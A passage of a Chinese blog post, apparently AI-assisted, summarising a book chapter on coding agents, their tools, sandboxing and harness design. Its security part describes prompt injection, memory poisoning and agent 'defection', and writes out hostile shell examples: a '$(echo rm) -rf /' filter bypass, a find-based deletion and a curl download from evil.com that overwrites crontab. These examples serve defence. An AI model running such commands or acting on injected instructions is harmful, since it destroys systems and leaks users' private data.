@@ -1,0 +1,2835 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="技术博客，记录学习与思考">
+<meta name="theme-color" content="#1a1d2e">
+<meta name="color-scheme" content="dark light">
+<title>《深入理解 AI Agent》精读：第五章 Coding Agent 与代码生成 - KurongBlog</title>
+
+<link rel="icon" type="image/svg+xml" href="/favicon.svg">
+
+<script>
+(function(){var m=localStorage.getItem('zhenhai-color-mode');if(!m){m='dark';}if(m==='auto'){m=matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light';}if(m==='dark'){document.documentElement.classList.add('dark');}})();
+</script>
+
+<link rel="preload" as="image" href="/images/zhenhai/xingtai/1200px-镇海改造日服预告.jpg">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,700;1,400&display=swap" media="print" onload="this.media='all'">
+<link rel="stylesheet" href="/assets/css/style.css?v=17">
+
+
+
+
+
+</head>
+<body>
+
+
+<header class="site-header">
+  <div class="header-inner">
+    <a class="site-brand" href="/">KurongBlog</a>
+
+    <nav class="header-nav">
+      
+      <a href="/">首页</a>
+      
+      <a href="/archives/">归档</a>
+      
+      <a href="/categories/">分类</a>
+      
+      <a href="/tags/">标签</a>
+      
+      <a href="/about/">关于</a>
+      
+    </nav>
+
+    <div class="header-actions">
+      <button class="header-btn search-open-btn" aria-label="Search" title="Search (Ctrl+K)">&#128269;</button>
+      <button class="header-btn theme-toggle-btn" aria-label="Toggle dark mode" title="Toggle theme">&#9790;</button>
+      <button id="settings-btn" class="header-btn settings-btn" title="阅读设置" aria-label="阅读设置">⚙</button>
+      <button id="hamburger-btn" class="header-btn hamburger-btn" aria-label="Menu">&#9776;</button>
+    </div>
+  </div>
+</header>
+
+
+<div id="reading-progress-bar" class="reading-progress-bar"></div>
+
+<div id="mobile-menu-overlay" class="mobile-menu-overlay"></div>
+<div id="mobile-menu-panel" class="mobile-menu-panel">
+  <button id="mobile-menu-close" class="mobile-menu-close" aria-label="Close menu">&times;</button>
+  <nav class="mobile-menu-nav">
+    
+    <a href="/">首页</a>
+    
+    <a href="/archives/">归档</a>
+    
+    <a href="/categories/">分类</a>
+    
+    <a href="/tags/">标签</a>
+    
+    <a href="/about/">关于</a>
+    
+  </nav>
+</div>
+
+<div id="search-overlay" class="search-overlay"></div>
+<div id="search-modal" class="search-modal">
+  <div class="search-modal-header">
+    <span class="search-modal-icon">&#128269;</span>
+    <div class="search-modal-input-wrap">
+      <input id="search-input" class="search-modal-input" type="text" placeholder="输入关键词搜索..." autocomplete="off" autocorrect="off" spellcheck="false">
+    </div>
+    <div class="search-modal-actions">
+      <span class="search-modal-hint">Esc</span>
+      <button id="search-modal-close" class="search-modal-close" aria-label="关闭搜索">&times;</button>
+    </div>
+  </div>
+  <div id="search-results" class="search-results"></div>
+</div>
+
+<main class="page-main">
+  <div class="content-area">
+    
+
+
+<nav id="floating-toc" class="floating-toc">
+  <div class="floating-toc-title">Contents</div>
+  <ul class="floating-toc-list" id="floating-toc-list"></ul>
+</nav>
+
+
+
+
+<article class="article-content">
+  <header class="article-header">
+    <h1 class="article-title">《深入理解 AI Agent》精读：第五章 Coding Agent 与代码生成</h1>
+    <div class="article-meta">
+      <time datetime="2026-08-04">2026-08-04</time>
+      <span class="ai-badge" title="AI 辅助生成">AI</span>
+      <span class="series-badge" title="系列"><a href="/series/%e6%b7%b1%e5%85%a5%e7%90%86%e8%a7%a3AI%20Agent/">深入理解AI Agent</a></span>
+      
+      <span class="separator">|</span>
+      <span>in <a href="/categories/AI/">AI</a></span>
+      
+    </div>
+    
+    <div class="post-card-tags" style="margin-top: 0.6rem;">
+      
+      <a class="tag" href="/tags/AI%20Agent/">AI Agent</a>
+      
+      <a class="tag" href="/tags/Coding%20Agent/">Coding Agent</a>
+      
+      <a class="tag" href="/tags/%e4%bb%a3%e7%a0%81%e7%94%9f%e6%88%90/">代码生成</a>
+      
+    </div>
+    
+  </header>
+
+  <blockquote>
+<p>本章：第五章 Coding Agent 与代码生成</p>
+</blockquote>
+<blockquote>
+<p>核心命题：以开放任务为目标的通用 Agent，其核心是一个 Coding Agent 加上文件系统；代码不只是写程序的工具，它是 Agent 形式化思考和精确表达的语言——一种&quot;元能力&quot;</p>
+</blockquote>
+<blockquote>
+<p>章内实验：实验 5-1 ~ 实验 5-12；配套仓库 chapter5/</p>
+</blockquote>
+<hr>
+<h2 id="0-">0. 章首核心观点</h2>
+<ul>
+<li>
+<p>回答核心问题：一个能处理任意任务的通用 Agent，架构长什么样？答案：<strong>Coding Agent（能自主编写、修改和执行代码的 Agent）+ 文件系统</strong>（Agent 存储代码、数据、记忆和中间结果的工作空间）。</p>
+</li>
+<li>
+<p>判断来自工业界实践验证——从 Manus 到 OpenClaw，成功的开放任务型通用 Agent 都遵循同一范式：<strong>用少量通用工具（代码执行、文件读写、搜索）构建 Coding Agent 运行时，在此之上叠加浏览器自动化、网络搜索等能力模块</strong>。</p>
+</li>
+<li>
+<p>为什么代码生成能担此重任？因为它是<strong>元能力</strong>——能在运行时动态创造出新的工具和能力。</p>
+</li>
+<li>
+<p>代码对 Agent 的价值两个层面：</p>
+<ul>
+<li>
+<p><strong>思考上</strong>：形式化代码让思考高度严谨——&ldquo;年龄大于 18 且已实名认证&quot;用自然语言描述可有多种理解，写成 <code>age &gt; 18 and is_verified</code> 毫无歧义；</p>
+</li>
+<li>
+<p><strong>表达上</strong>：一段能跑通的代码本身就是逻辑自洽的证明，执行结果提供客观的对错标准——自然语言做不到。</p>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="1-coding-agent">1. Coding Agent</h2>
+<h3 id="11-coding--agent-">1.1 Coding 是 Agent 的基础能力</h3>
+<ul>
+<li>
+<p>代码生成不是少数专门化 Agent 的专利，而是每个通用 Agent 都该具备的基础能力。典型任务&quot;整理仓库中所有遗留的 TODO 注释&quot;需要五类操作：浏览目录结构（ls/glob）、读取代码（read）、修改文件（edit/write）、运行命令（bash）、查找模式（grep/search）。</p>
+</li>
+<li>
+<p><strong>七个核心工具</strong>（Coding Agent 规范化参考集）：</p>
+<ol>
+<li>
+<p>Code Interpreter（代码解释器）：隔离沙盒环境，安全执行 Python 代码；</p>
+</li>
+<li>
+<p>Bash Shell（命令行终端）：运行测试、处理特殊格式文件；</p>
+</li>
+<li>
+<p>读文件工具：读取代码、配置、文档、日志；</p>
+</li>
+<li>
+<p>写文件工具：创建新文件或完全重写；</p>
+</li>
+<li>
+<p>编辑文件工具：局部修改，代码维护和迭代的核心操作；</p>
+</li>
+<li>
+<p>搜索文件名工具（Glob）：模式匹配定位文件（**/*.py）；</p>
+</li>
+<li>
+<p>搜索文件内容工具（Grep）：内容搜索（搜索所有调用某函数的代码行）。</p>
+</li>
+</ol>
+</li>
+<li>
+<p>均可通过第四章的 MCP 协议暴露为标准化工具服务。注意：这是 Coding Agent 特有配置，不同于第四章五类通用工具分类——七个核心工具主要覆盖感知和执行两类；协作、事件触发、用户沟通在 Coding Agent 中通常由 Agent 框架（而非工具层）处理。</p>
+</li>
+<li>
+<p>TODO 清单例子：Grep(&ldquo;TODO&rdquo;) 找到 3 处 → Write(&ldquo;TODO_LIST.md&rdquo;)——整个过程只用两个工具。</p>
+</li>
+<li>
+<p><strong>为什么每个通用 Agent 都应具备 coding 能力</strong>：代码生成不只是写程序，而是通用的问题解决手段——数学推理写代码交求解器、业务规则用代码精确固化、缺工具临时写一个、数据格式变动态生成解析逻辑。</p>
+</li>
+</ul>
+<h3 id="12--manus--openclaw-agent--coding-">1.2 案例：从 Manus 到 OpenClaw——通用 Agent 的 Coding 内核</h3>
+<ul>
+<li>
+<p>为什么 Coding Agent 是核心而非 Deep Research 或 Computer Use？<strong>因为几乎所有高效的内容生成最终都要落到代码上</strong>：PPT 本质是 OOXML 格式的代码，Word/PDF 可通过代码生成，数据分析可视化由 Python 脚本完成，成功的浏览器操作序列可固化为可复用的 RPA 代码。Computer Use 虽然通用性更强，但成本、延迟和稳定性远不如直接通过代码或 API 完成相同操作。<strong>代码生成是效率最高、成本最低、可复用性最强的能力基座</strong>。</p>
+</li>
+<li>
+<p>执行流示例（&ldquo;analyze last quarter&rsquo;s sales data&rdquo;）：读记忆（MEMORY.md 发现用户偏好 PDF、数据源 Google Sheets）→ 调工具（搜索 Google Sheets API 用法、代码执行下载数据）→ 写代码（pandas 聚合、matplotlib 可视化）→ 生成产物（report.pdf、charts/）→ 更新记忆。<strong>文件系统是信息流转的枢纽</strong>。</p>
+</li>
+<li>
+<p><strong>文件系统作为 Agent 的中枢</strong>：长期记忆存储在 MEMORY.md（高层事实和用户偏好）和按日期归档的 Markdown 日志。选择 Markdown 而非向量数据库看似反直觉实则有效：用户可直接打开阅读修改（记错了删那一行即可）、Markdown 天然保留时间顺序避免语义检索的时间混淆、可通过 Git 版本控制和回滚。Agent 拥有写文件能力 = 具备修改自身外部产物的技术条件。</p>
+</li>
+<li>
+<p><strong>适用边界</strong>：&ldquo;Coding Agent 是通用 Agent 核心&quot;主要适用于<strong>以开放任务为目标的通用 Agent</strong>（深度调研、内容生成、数据处理——任务边界不确定、产物形态多样，无法预先枚举所有工具，代码生成作为元能力提供动态扩展能力边界的最经济路径）。垂直领域 Agent（客服、语音助手）任务空间封闭，核心架构围绕固定业务流程、领域工具和对话策略，代码更多是工具箱里的一件工具（τ-bench 例子中代码扮演政策校验工具的角色）。<strong>但即便后者，coding 也是不可或缺的基础能力</strong>——是否以 Coding 为核心架构因场景而异，但具备 coding 能力是所有 Agent 的共同底线。</p>
+</li>
+</ul>
+<h3 id="13-sessionless-">1.3 Sessionless 设计</h3>
+<ul>
+<li>
+<p>OpenClaw 采用 Sessionless（无会话）设计：没有安装、登录、&ldquo;打开 App&quot;步骤，Agent 常驻在线，用户通过已在用的消息平台随时发消息得到响应。前提：大模型已成熟到足以充当&quot;智能基座&rdquo;——类似传统操作系统屏蔽硬件、为上层应用提供统一抽象，大模型屏蔽语言理解与思考规划的复杂性，为上层 Agent 提供统一智能抽象。</p>
+</li>
+<li>
+<p><strong>Sessionless 真正的工程难点：代码执行环境和文件系统状态如何跨消息存活</strong>（两条消息可能间隔几分钟也可能几天，Agent 工作依赖大量隐式状态：沙盒装的依赖包、终端会话的工作目录和环境变量、后台运行的开发服务器、写到一半的文件）。OpenClaw 把状态分两层管理：</p>
+<ul>
+<li>
+<p><strong>文件系统状态天然持久</strong>：工作区（workspace）目录挂载在沙盒之外的持久存储上，跨消息、跨沙盒重启不丢失——&ldquo;文件系统作为 Agent 中枢&quot;的另一层含义；</p>
+</li>
+<li>
+<p><strong>进程状态按需保活或重建</strong>：沙盒及终端会话活跃期间保持运行（避免每条消息冷启动、重新切换目录、重新激活虚拟环境）；闲置超时后销毁回收资源，销毁前把可序列化的环境状态（工作目录、环境变量、后台任务清单）记录到工作区文件，下次唤醒时由 Agent 按记录重建。</p>
+</li>
+</ul>
+</li>
+<li>
+<p>Sessionless 意味着每次用户消息都需重新加载完整轨迹和工作状态——对状态序列化效率、轨迹压缩策略要求更高。</p>
+</li>
+</ul>
+<h3 id="14-coding-agent-">1.4 Coding Agent 的安全</h3>
+<ul>
+<li>
+<p><strong>威胁模型——Simon Willison 的&quot;致命三要素&rdquo;</strong>（三者齐备即构成完整攻击闭环，系统即属高危）：</p>
+<ol>
+<li>
+<p><strong>访问私有数据</strong>——Agent 能读取用户文件和密码管理器；</p>
+</li>
+<li>
+<p><strong>暴露于不受信任内容</strong>——处理的邮件和网页可能包含恶意载荷；</p>
+</li>
+<li>
+<p><strong>具备外部通信能力</strong>——能发送邮件和执行命令。</p>
+</li>
+</ol>
+<ul>
+<li>
+<p>攻击路径闭合：恶意指令藏在不受信任内容中进入 Agent → 驱使它读取私有数据 → 经对外通道传出。<strong>三要素齐备本身就已足够危险，不需要任何额外条件</strong>。</p>
+</li>
+<li>
+<p>本书补充<strong>第四维度：持久记忆</strong>——不是并列的第四个必要条件，而是<strong>攻击的放大器</strong>：攻击者把看似无害的偏见或恶意指令写入 Agent 长期记忆，跨会话潜伏、合适时机触发，把一次性攻击升级为长期潜伏与放大。</p>
+</li>
+<li>
+<p>四点概括为四类边界：<strong>数据边界、输入信任边界、输出影响边界、跨会话边界</strong>。OpenClaw 这样的全权限本地 Agent 恰恰四者兼备。</p>
+</li>
+</ul>
+</li>
+<li>
+<p>这解释了闭源商业 Agent（如 Claude Cowork）为何选择保守权限策略——不是技术做不到，而是安全风险太高。面对提示注入威胁，单靠输入过滤基本挡不住。<strong>重点不是识别所有攻击，而是让 Agent 即使被注入，也没有机会把危险动作真正执行出去</strong>。</p>
+</li>
+<li>
+<p>防御体系（前两章已分层建立）：上下文层防御（外部内容来源标注、结构化角色隔离、输入清洗——第二章）；执行层防御（Sidecar 独立审查、Human in the loop、最小权限与权限分离——第四章）。<strong>同一上下文中的 Agent 很难判断自己是否已被注入，因此关键操作必须由上下文之外的机制复核</strong>。</p>
+</li>
+<li>
+<p>本章补充 Coding Agent 特有的三点增量：</p>
+<ol>
+<li>
+<p><strong>命令语义解析</strong>——Shell 命令的组合爆炸使关键字黑名单形同虚设，必须在语义层理解命令真实效果；</p>
+</li>
+<li>
+<p><strong>沙盒隔离与网络出口控制</strong>——代码执行是 Coding Agent 独有的攻击面；</p>
+</li>
+<li>
+<p><strong>持久记忆的跨会话防线</strong>——写入长期记忆的内容需经过与外部内容同等的信任审查，避免恶意指令潜伏在 MEMORY.md 中长期生效。</p>
+</li>
+</ol>
+</li>
+<li>
+<p><strong>隔离兜底：代码执行沙盒的工程选型</strong>（第四章讲&quot;为什么隔离&quot;和分级原理，这里补四项落地增量）：</p>
+<ul>
+<li>
+<p><strong>网络出口控制</strong>（最易被忽视却最关键）：默认断网，按需通过白名单代理放行有限目的地（包管理源、文档站点、任务明确需要的 API）。回看致命三要素第 3 条——网络出口控制正是它的执行面防御：<strong>即使提示注入成功、恶意代码在沙盒内读到敏感数据，没有出口就传不出去</strong>。相比识别每次注入，掐断数据外传通道是确定性得多的防线；</p>
+</li>
+<li>
+<p><strong>文件系统隔离范围</strong>：源码目录只读挂载（通过编辑工具改代码、补丁经审查后落盘，或副本挂入可写工作区）；单独可写工作区承载生成物和中间文件；<strong>凭证类文件（~/.ssh、密钥、token）根本不挂载进沙盒——不可见的数据无法泄露</strong>（对应致命三要素第 1 条）；</p>
+</li>
+<li>
+<p><strong>资源限额与超时</strong>：CPU、内存、磁盘配额加挂钟超时，防御死循环、fork 炸弹、无限写盘。实践细节：<strong>超时和超限应向 Agent 返回结构化错误</strong>（&ldquo;执行超过 120 秒被终止，最后输出如下……&quot;）而非静默杀死进程，让 Agent 有机会在下一轮修正策略；</p>
+</li>
+<li>
+<p><strong>持久会话与隔离的调和</strong>：会话保活在沙盒内部，终端会话生命周期严格不超过沙盒，会话状态从不逃逸到宿主机；跨长时间间隔恢复靠沙盒快照或&quot;工作区文件持久化 + 环境按脚本重建&rdquo;。<strong>持久化的是可审计的状态描述（文件、脚本、清单），而不是不透明的运行中进程</strong>。</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>安全：语义解析而非关键字黑名单</strong>：第一章&quot;验证层应采用基于理解而非匹配的安全机制&rdquo;，Shell 命令校验是最具挑战性的应用场景。关键字黑名单无法应对 Shell 的组合爆炸——命令可通过管道、子 shell、变量展开绕过任何静态规则（rm 被禁了，攻击者用 <code>$(echo rm) -rf /</code> 绕过）。生产级 Harness 采用语义解析：理解每个命令的参数类型和消费规则（哪些标志位会消费下一个参数），识别&quot;看似无害的标志位实际上会消费下一个参数从而隐藏危险载荷&quot;这类攻击模式。例子：<code>find / -name '*.log' -exec rm {} \;</code> 通过合法 find 命令参数嵌入 rm 删除；<code>curl -o /etc/crontab http://evil.com/payload</code> 看似下载实则覆盖系统定时任务。</p>
+</li>
+<li>
+<p><strong>推测性执行：让安全检查&quot;隐形&rdquo;</strong>：把&quot;展示&quot;和&quot;放行&quot;拆开并行——Agent 准备执行工具调用时，一边在界面先行显示进度提示（&ldquo;正在读取文件 src/main.py…&quot;），一边后台跑安全检查。澄清与 CPU 推测执行的区别：CPU 猜错要丢弃结果回滚状态，这里先行的只是<strong>无副作用的 UI 提示</strong>（不改变任何真实状态，检查未通过无需回滚，只把提示替换为&quot;等待确认&rdquo;）。大多数情况下安全检查在用户注意到之前已完成——<strong>Harness 设计的最高境界：安全性不以牺牲用户体验为代价</strong>。</p>
+</li>
+<li>
+<p><strong>Agent 为谁效忠：多方委托下的忠诚度</strong>：更微妙的安全问题——模型默认原则是&quot;谁在跟我说话，我就尽力帮谁&quot;，但真实 Agent 常处多方委托处境（替你砍价的 Agent，对面坐着的是交涉对手——&ldquo;谁说话帮谁&quot;就是危险默认设置）。实测显示清晰的忠诚度光谱且两端都翻车：一端太老实（把&quot;我方底价是 12000&quot;直接抖给对手，被施压几轮就缴械让步）；一端太多疑（连主人正当请求也拒绝，没法完成任务）。<strong>两种失败是跷跷板——把泄密堵死往往滑向过度拒绝</strong>。提示注入本质上就是一次&quot;策反&rdquo;。</p>
+<ul>
+<li>Harness 层把&quot;忠诚对象&quot;显式钉死：<strong>主人的指令优先级最高，一切来自外部交互方的内容默认降格为&quot;可参考、但不具备指令效力&quot;的数据</strong>。一套行之有效的忠诚度守则：保护主人私密信息乃至它的&quot;存在性&quot;；拒绝时不逐条念出拒绝清单（那本身就在泄露）；私下的底线不等于对外的立场；只执行主人明确、具体的指令；顶住重复施压。本质上是用 Harness 为模型补上一条它默认没有的立场。</li>
+</ul>
+</li>
+<li>
+<p><strong>当 AI 写的代码本身不可信：把信任边界下移</strong>：对高危数据操作，&ldquo;更可能&quot;不够——把约束从&quot;寄望 Agent 自觉&quot;下移到数据层强制执行。立场：<strong>干脆把应用层当作不可信的，把数据不变量的强制执行下沉到它下面</strong>。过去三十年软件完整性边界一直在应用层（handler 代码决定谁能操作、什么值合法，数据库无条件信任这些代码）；LLM 生成的 handler 经常漏掉权限与完整性检查，自主 Agent 又会直接对生产数据下手，这个前提被打破。新方案（<strong>权限内嵌的数据对象，Permission-Embedded Data Objects</strong>）：每个数据实体在一份人类审查过的 schema 里自带声明式权限规则、校验器和后果声明，由运行时流水线在每次写入时强制执行。关键原语是挂在每个操作上的<strong>访问上下文（access context）</strong>：被重新生成的 handler 以它所服务的用户的权限运行，自主 Agent 以它自己受限的身份（scoped principal）运行——<strong>与其只寄望 Agent 忠诚，不如从架构上把它降格为权限受限的主体，让它即便被策反也越不过雷池</strong>。</p>
+<ul>
+<li>
+<p>对照数据：同一批 prompt 上，这套机制做到没有任何一次写入违反声明的不变量；而裸 SQL、LLM 自己写的检查、宪法式提示、动作边界拦截器都会漏过数次到数十次违规。它不是&quot;更可能对&rdquo;，而是&quot;不可能错&quot;，代价只是每次写入多花约 2 毫秒。保证有前提：schema 要真的把不变量写全，部署上堵死不可信层绕过存储、直连数据库的所有路径。</p>
+</li>
+<li>
+<p>架构原则：<strong>当写代码的和跑代码的都可能不可信时，真正可靠的约束不能待在被生成的代码里，而要待在它下面那层人类审查过的地基里</strong>——第一章&quot;约束优先于指导&quot;原则在数据层的终极形态。</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="15-coding-agent-">1.5 Coding Agent 的整体流程</h3>
+<ul>
+<li>
+<p>理想化工程流程（软件工程最佳实践投射到 Agent 身上；现实 Coding Agent 更多按反应式迭代循环工作、按需裁剪——简单任务跳过设计文档，只有任务复杂影响面大才完整走完）：</p>
+<ul>
+<li>
+<p><strong>项目文档化</strong>：首次接触仓库先建立整体认知框架（像新入职工程师第一天熟悉项目结构）。检查 README、架构设计文档、开发者指南；关键文档缺失时主动承担文档化责任——系统性读代码库，识别主要模块、核心抽象、组件依赖，生成含架构概览、目录结构、测试运行指南的初始文档。<strong>知识的显式化是高效协作的前提</strong>。</p>
+</li>
+<li>
+<p><strong>项目指令文件</strong>（Agent 专用文档形态）：CLAUDE.md、AGENTS.md、.cursorrules 已成为业界事实标准——每次会话开始自动注入上下文，相当于项目级系统提示词。与面向人类读者的 README 不同，指令文件承载面向 Agent 的行为约定：构建与测试命令（&ldquo;用 pnpm test 而不是 npm test&rdquo;）、代码风格（&ldquo;禁用 any 类型&rdquo;）、禁区（&ldquo;不要改动 migrations/ 目录&rdquo;）。与 OpenClaw 的 SOUL.md（定义 Agent 身份与行为规则）、MEMORY.md（沉淀跨会话经验）同一思路：SOUL.md 约定&quot;Agent 是谁&quot;，项目指令文件约定&quot;在这个项目里该怎么干活&quot;。从上下文工程角度看，指令文件还是<strong>最经济的稳定前缀</strong>——内容不随任务变化，天然对 KV Cache 友好。</p>
+</li>
+<li>
+<p><strong>知识显式化推论</strong>：对远程工作友好的团队往往也对 AI Agent 友好——远程团队被迫依赖异步沟通与文档化（决策记录在文档、上下文写在 issue/PR 描述、部落知识沉淀在开发者指南），恰好是 Agent 能消费的知识形态。<strong>评估团队&quot;AI-ready&quot;程度的简单代理指标：一个远程新人只靠代码仓库和文档，能不能独立开展工作</strong>。</p>
+</li>
+<li>
+<p><strong>任务理解与需求澄清</strong>：边界清晰、影响范围有限的简单需求可直接实现；复杂需求（需求模糊、实现路径多样、影响范围广泛）必须探索性调研澄清边界、必要时主动与用户对话（&ldquo;优化系统性能&quot;先搞清楚目标、权衡、瓶颈）。<strong>需求模糊状态下开始编码往往导致大量返工</strong>。</p>
+</li>
+<li>
+<p><strong>编写设计文档</strong>：把抽象需求转化为具体实现计划——修改哪些模块及原因、采用什么方案及相对优势、引入哪些新依赖、预期系统影响。编写设计文档本身就是深度思考；<strong>更重要：为人类提供高效介入点——审查简洁的设计文档比审查数百行代码容易得多</strong>。完成设计文档后提交用户审查，等待批准再继续。</p>
+</li>
+<li>
+<p><strong>代码实现与测试</strong>：遵循项目代码规范、复用现有抽象、必要时适度重构。实现完成后进入测试驱动质量保障——为新增/修改功能编写测试用例（正常路径、边界条件、异常情况）→ 执行测试套件 → 失败则分析原因、定位问题、修改直到通过。&ldquo;测试-修复&quot;循环的自我纠错能力将 Coding Agent 从代码生成器提升为可靠工程助手。<strong>Coding Agent 最常见的偷懒方式就是跳过这一环节——写完代码不跑测试就报告&quot;任务完成&rdquo;。把&quot;测试通过&quot;而非&quot;代码写完&quot;定义为完成标准，正是 Loop 工程&quot;由验证判定何时可以停&quot;原则的落地</strong>。</p>
+</li>
+<li>
+<p><strong>代码审查</strong>：对自己生成的代码批判性审视——可读性、注释、性能问题、安全漏洞、代码风格。通过阅读代码、运行 lint 或调用专门审查子 Agent 实现。发现问题回到修改阶段。</p>
+</li>
+<li>
+<p><strong>文档同步与交付</strong>：架构层面变化（新模块、改依赖、改核心抽象）时更新架构文档——<strong>过时的文档比没有文档更糟糕</strong>。</p>
+</li>
+<li>
+<p>总结：<strong>计划先于行动，验证贯穿始终，文档与代码共同演化</strong>。</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="16-harness--coding-agent-">1.6 Harness 工程在 Coding Agent 中的实践</h3>
+<ul>
+<li>
+<p><strong>Coding Agent 大概是 Harness 工程收益最大的领域</strong>——代码编写是所有 Agent 任务中可验证性最高的一类。能不能稳定运行，往往不取决于模型多强，而取决于基础设施多扎实。落地为具体工程组件：</p>
+<ul>
+<li>
+<p>验收基线（什么算做完）：测试套件、CI 管道、代码审查标准；</p>
+</li>
+<li>
+<p>执行边界（能碰什么不能碰什么）：模块边界、依赖规则、权限控制；</p>
+</li>
+<li>
+<p>反馈信号（自动化的对错判断）：Linter 输出、测试结果、类型检查错误；</p>
+</li>
+<li>
+<p>回退手段（出了问题怎么恢复）：Git 版本控制、沙盒隔离、快照回滚。</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>为什么 Coding Agent 特别适合 Harness 工程</strong>——任务清晰度 × 验证自动化程度四象限（表 5-1）：</p>
+</li>
+</ul>
+<p>| | 结果可自动验证 | 结果需人工验证 |</p>
+<p>|&mdash;|&mdash;|&mdash;|</p>
+<p>| 目标明确 | <strong>最佳区域</strong>：修复有测试用例的 bug | 吞吐量受限：代码重构需人工审查 |</p>
+<p>| 目标模糊 | 高效地跑偏：用 linter 优化&quot;代码质量&rdquo; | 难以启动：&ldquo;让 UI 更好看&rdquo; |</p>
+<ul>
+<li>
+<p>Harness 的目标就是把尽可能多的任务推向&quot;目标明确 + 验证自动化&quot;象限。代码编写天然处于核心——测试套件提供验收标准、Linter 和类型检查器提供即时验证、Git 提供完美回退。<strong>这解释了为什么 Coding Agent 是当前成熟度最高的 Agent 类型：不是因为代码生成模型特别强，而是因为软件工程几十年积累的基础设施天然构成了一套强大的 Harness</strong>。</p>
+</li>
+<li>
+<p>业界实践三案例：</p>
+<ul>
+<li>
+<p><strong>大规模代码迁移</strong>（大型科技公司公开实践）：关键不在模型强而在 Harness 做对三件事——知识必须存在于代码库本身（Agent 看不到的等于不存在）、约束编码进 Linter 和 CI 而非写在文档里、验证和纠正全链路自动化；</p>
+</li>
+<li>
+<p><strong>LangChain</strong>：仅通过优化 Harness（系统提示词、工具中间件、自验证循环）显著提升基准表现。尤其&quot;<strong>用 Agent 分析失败轨迹来改进 Harness</strong>&ldquo;的方法论使 Harness 工程从人工经验驱动转向数据驱动；</p>
+</li>
+<li>
+<p><strong>Anthropic</strong>：长任务拆两个角色——初始化 Agent 负责把大任务分解为任务清单，执行 Agent 负责逐步推进并把中间成果留给下一轮。解决长时运行 Agent&quot;一次想做太多&quot;或&quot;过早声称完成&rdquo;。</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>可迁移的通用 Harness 设计原则</strong>：</p>
+<ul>
+<li>
+<p><strong>约束优先于指导</strong>：能用代码强制的规则就不要用文档建议。Linter 规则、类型约束、CI 检查的价值远超系统提示词中&quot;请遵循…&quot;——前者是&quot;做不了&quot;，后者只是&quot;建议别做&quot;；</p>
+</li>
+<li>
+<p><strong>验证要自动化</strong>：人工审查是不可扩展的瓶颈；</p>
+</li>
+<li>
+<p><strong>反馈越快越好、越结构化越好</strong>：错误信息越详细、越接近错误时刻，纠正效率越高（第二章 Agent 状态栏技术的体现）；</p>
+</li>
+<li>
+<p><strong>回退要可靠</strong>：Agent 在安全网内操作才能大胆试错。Git 分支、沙盒、快照确保错误可逆。</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>约束的另一层目的：防止过程性错误</strong>：验收基线管结果对不对，执行边界管过程——即使结果正确，用错误方法达成也不行（修复数据库故障直接把库删了重建——&ldquo;修复&quot;生效但数据没了；修复编译错误把代码全删重写——编译通过但实现没了）。这类破坏性捷径总是存在——即使把限制写进最终评估指标，Agent 也常能找到绕过办法（第七章 reward hacking 在 Agent 任务中的日常形态）。生产级 Harness 对 rm -rf、删除生产数据、覆盖未读文件等危险动作设专门检查与审批（语义解析、Sidecar 复核）——<strong>约束的是动作而非仅仅是结果</strong>。第七章的 RLVP（验证路径惩罚）从训练侧回答同一问题：在最终结果奖励之外，对过程中可验证的违规动作施加惩罚。对已有模型 Harness 护栏是外部约束，对可训练模型过程惩罚是内部内化——目标一致。</p>
+</li>
+<li>
+<p><strong>工具编排：故障边界控制</strong>：成熟的 Coding Agent 支持并行工具调用，独特问题是故障如何传播。<strong>原则：故障只在同一批并行调用内传播，不上升到父级操作</strong>——同时读三个文件其中一个找不到，只报告这一个失败，不取消另外两个，更不让整个任务中止。</p>
+</li>
+</ul>
+<h3 id="17-">1.7 故障与错误恢复</h3>
+<ul>
+<li>
+<p>第一章消融实验已展示问题严重性：仅仅缺失一条工具结果反馈就足以让 Agent 陷入无限循环。生产环境故障远比实验多样。</p>
+</li>
+<li>
+<p><strong>故障分类学：四层故障</strong>（按发生位置）：</p>
+<ul>
+<li>
+<p><strong>API 层</strong>：限流（HTTP 429）、服务过载、请求超时、连接中断、输出触顶被截断——与任务内容无关，基础设施噪声；</p>
+</li>
+<li>
+<p><strong>工具层</strong>：幻觉调用（调用了不存在的工具）、参数畸形（不符合输入约束）、执行抛异常，以及最危险的一种——<strong>工具反复返回同一个错误而模型不加改变地反复重试</strong>；</p>
+</li>
+<li>
+<p><strong>上下文层</strong>：上下文窗口溢出、压缩失败、轨迹结构损坏（工具调用缺少配对的结果消息）；</p>
+</li>
+<li>
+<p><strong>控制流层</strong>：死循环（反复执行相同操作毫无进展）与<strong>死亡螺旋</strong>（错误触发的恢复逻辑自身又调用 LLM、再次出错、连锁反应）。</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>检测：先分类，再计数</strong>：捕获故障后第一个判断不是&quot;要不要重试&quot;而是&quot;值不值得重试&rdquo;——可重试错误（限流、过载、网络抖动）重试才有意义；不可重试错误（参数不合法、权限不足、工具不存在）原样重试多少次都是同样结果，必须改变输入或策略。生产级 Harness 维护<strong>错误到恢复策略的映射表</strong>，而不是笼统&quot;出错就重试&quot;。</p>
+<ul>
+<li>
+<p>单次错误之外检测模式：<strong>重复调用指纹</strong>（&ldquo;工具名 + 参数&quot;计算指纹，相同指纹反复出现就是无进展循环信号）；<strong>连续失败计数</strong>（每条恢复路径独立计数器，为熔断提供依据）。</p>
+</li>
+<li>
